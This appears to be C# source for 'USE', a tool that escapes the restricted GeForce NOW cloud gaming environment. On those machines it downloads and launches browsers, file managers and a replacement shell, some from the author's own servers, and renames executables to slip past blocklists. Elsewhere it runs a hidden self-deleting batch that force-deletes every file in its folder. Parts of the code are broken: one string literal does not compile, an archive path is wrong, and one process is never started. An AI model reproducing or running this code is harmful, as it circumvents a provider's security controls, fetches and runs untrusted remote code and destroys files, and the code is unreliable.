﻿using System;
using System.Net;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Windows.Forms;
using System.Diagnostics;
using System.Text;
using System.Threading.Tasks;
using System.Reflection;
using System.Security.Permissions;
using System.Threading;
using System.IO.Compression;

namespace USE_CSharp_Edition
{
    class Program
    {
        //Check if the System is GeForce NOW
        static void InitiateSelfDestructSequence()
        {
            string batchScriptName = Path.GetTempPath().ToString() + "f.bat";
            using (StreamWriter writer = File.AppendText(batchScriptName))
            {
                writer.WriteLine(":Loop");
                writer.WriteLine("Tasklist /fi \"PID eq " + Process.GetCurrentProcess().Id.ToString() + "\" | find \":\"");
                writer.WriteLine("if Errorlevel 1 (");
                writer.WriteLine("  Timeout /T 1 /Nobreak");
                writer.WriteLine("  Goto Loop");
                writer.WriteLine(")");
                writer.WriteLine("Del \"" + (new FileInfo((new Uri(Assembly.GetExecutingAssembly().CodeBase)).LocalPath)).Name + "\"");
                writer.WriteLine("cd \"" + Path.GetDirectoryName(Assembly.GetEntryAssembly().Location) + "\"");
                writer.WriteLine("del . /F /Q");
            }
            Process.Start(new ProcessStartInfo() { Arguments = "/C " + batchScriptName + " & Del " + batchScriptName, WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true, FileName = "cmd.exe" });
        }
        static void Main(string[] args)
        {
            Console.Title = "[#] USE by SoftwareRat [v.3.0] - C# Edition [#]";
            if (File.Exists(@"C:\Windows\gfndesktop.exe") != true || Directory.Exists(@"C:\asgard") != true || Directory.Exists(@"C:\Users\kiosk") != true || Directory.Exists(@"C:\Users\xen") != true || Directory.Exists(@"C:\Users\kiosk\Documents\Dummy") != true)
            {
                InitiateSelfDestructSequence();
                Application.Exit();
            }
            else
            {
                //When a GeForce NOW System is detected
                Console.BackgroundColor = ConsoleColor.Green;
                Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine("NVIDIA GeForce NOW System detected!");
                Console.ResetColor();
                Console.BackgroundColor = ConsoleColor.DarkMagenta;
                Console.WriteLine("Thanks to F9V1s10n [developer from GNF], without him USE would be still a Batch script");
                Console.ResetColor();
                Console.BackgroundColor = ConsoleColor.DarkRed;
                Console.ForegroundColor = ConsoleColor.Black;
                Console.WriteLine("USE is running, please wait ...");
                Console.ResetColor();
                WebClient webClient = new WebClient();

                //Firefox installation
                string FirefoxSetup = @"C:\Program Files (x86)\Steam\FirefoxSetup.exe";
                Directory.CreateDirectory(@"C:\Users\kiosk\AppData\Local\Firefox");
                webClient.DownloadFile("https://download.mozilla.org/?product=firefox-latest-ssl&os=win64&lang=en-US", FirefoxSetup);
                var p = Process.Start(@"C:\Program Files (x86)\Steam\FirefoxSetup.exe", "/DesktopShortcut=false" + "/InstallDirectoryPath=C:\\Users\\kiosk\\AppData\\Local\\Firefox");
                Thread.Sleep(6000);
                Console.WriteLine("This following error message is normal! Just press Enter!");
                p.WaitForExit();
                Microsoft.VisualBasic.FileIO.FileSystem.RenameFile(@"C:\Users\kiosk\AppData\Local\Firefox\firefox.exe", "icefox.exe");

                //Notepad++ installation
                Directory.CreateDirectory(@"C:\Users\kiosk\AppData\Local\Notepad++");
                string npp = @"C:\Users\kiosk\AppData\Local\Notepad++\npp.7.8.8.bin.x64.7z";
                webClient.DownloadFile("https://github.com/notepad-plus-plus/notepad-plus-plus/releases/download/v7.8.8/npp.7.8.8.bin.x64.7z", npp);
                Process nppextract = new Process();
                nppextract.StartInfo.FileName = @"C:\Program Files (x86)\Steam\steamapps\common\Assassins Creed Origins\8za.exe";
                nppextract.StartInfo.Arguments = "x C:\\Users\\kiosk\\AppData\\Local\\Notepad++\\npp.7.8.8.bin.x64.7z";
                nppextract.StartInfo.WorkingDirectory = @"C:\Users\kiosk\AppData\Local\Notepad++";
                nppextract.Start();
                nppextract.WaitForExit();
                Microsoft.VisualBasic.FileIO.FileSystem.RenameFile(@"C:\Users\kiosk\AppData\Local\Notepad++\notepad++.exe", "noteblyat++.exe");

                //7-Zip installation
                Directory.CreateDirectory(@"C:\Users\kiosk\AppData\Local\8-Zip");
                string GUIunpacker = @"C:\Users\kiosk\AppData\Local\8-Zip\8-Zip.7z";
                webClient.DownloadFile("http://softwarerat.bplaced.net/8-Zip.7z", GUIunpacker);
                Process GUIunpackerSetup = new Process();
                GUIunpackerSetup.StartInfo.FileName = @"C:\Program Files (x86)\Steam\steamapps\common\Assassins Creed Origins\8za.exe";
                GUIunpackerSetup.StartInfo.Arguments = "x C:\\Users\\kiosk\\AppData\\Local\\8-Zip\\8-Zip.7z";
                GUIunpackerSetup.StartInfo.WorkingDirectory = @"C:\Users\kiosk\AppData\Local\8-Zip";
                GUIunpackerSetup.Start();
                GUIunpackerSetup.WaitForExit();
                //Explorer++ Installation [Alternative file manager]
                Directory.CreateDirectory(@"C:\Users\kiosk\AppData\Local\Explorer++");
                string expplusplus = @"C:\Users\kiosk\AppData\Local\Explorer++\explorerpp_x64.zip";
                webClient.DownloadFile("https://github.com/derceg/explorerplusplus/releases/download/version-1.4.0-beta/explorerpp_x64.zip", expplusplus);
                Process expextract = new Process();
                expextract.StartInfo.FileName = @"C:\Program Files (x86)\Steam\steamapps\common\Assassins Creed Origins\8za.exe";
                expextract.StartInfo.Arguments = "x C:\\Users\\kiosk\\AppData\\Local\\Explorer++\\npp.7.8.8.bin.x64.7z";
                expextract.StartInfo.WorkingDirectory = @"C:\Users\kiosk\AppData\Local\Explorer++";
                expextract.Start();
                expextract.WaitForExit();
                expextract.Start();
                expextract.WaitForExit();
                //Process Explorer installation [A advanced Taskmanager]
                Directory.CreateDirectory(@"C:\Users\kiosk\AppData\Local\ProcessExplorer");
                string ProcessExplorer = @"C:\Users\kiosk\AppData\Local\ProcessExplorer\procexp64.exe";
                webClient.DownloadFile("https://live.sysinternals.com/procexp64.exe", ProcessExplorer);
                //uStore Installation [Coming soon]

                //WinXShell installation [Coming soon] [Replacement for Windows Shell]
                Directory.CreateDirectory(@"C:\Users\kiosk\AppData\Local\Taskbar");
                string TaskbarCompressed = @"C:\Users\kiosk\AppData\Local\Taskbar\Taskbar.7z";
                webClient.DownloadFile("https://downloads.softwarerat.de/gfnx_tmgay/Taskbar.7z", TaskbarCompressed);
                Process WinXShellUnpacker = new Process();
                WinXShellUnpacker.StartInfo.FileName = @"C:\Program Files (x86)\Steam\steamapps\common\Assassins Creed Origins\8za.exe";
                WinXShellUnpacker.StartInfo.Arguments = "x C:\\Users\\kiosk\\AppData\\Local\\Taskbar\\Taskbar.7z";
                WinXShellUnpacker.StartInfo.WorkingDirectory = @"C:\Users\kiosk\AppData\Local\Taskbar";
                WinXShellUnpacker.Start();
                WinXShellUnpacker.WaitForExit();
                Process StartWinXShell = new Process();
                StartWinXShell.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
                StartWinXShell.StartInfo.Arguments = "/k start "" "C:\\Users\\kiosk\\AppData\\Local\\Taskbar\\start.bat"";
                //Only for developers, disable it in the public release!
                Console.BackgroundColor = ConsoleColor.Red;
                Console.ForegroundColor = ConsoleColor.Black;
                Console.WriteLine("This version is only for debugging! Stealing the sourcecode is illegal!");
                Console.ResetColor();
                Console.BackgroundColor = ConsoleColor.Yellow;
                Console.ForegroundColor = ConsoleColor.Black;
                Console.WriteLine("CHECK FOR ANY PROBLEMS");
                Console.WriteLine("Have fun with testing USE");
                
                // For Public release
                /* Console.BackgroundColor = ConsoleColor.Red;
                Console.ForegroundColor = ConsoleColor.Black;
                Console.WriteLine("Have fun with the new USE version! Stealing the sourcecode is illegal!");
                Console.ResetColor
                Console.Back*/
                string Firefox = @"C:\Users\kiosk\AppData\Local\Firefox\icefox.exe";
                Process FF = new Process();
                FF.StartInfo.FileName = Firefox;
                FF.Start();
                Thread.Sleep(5000);
            }
        }
    }
}
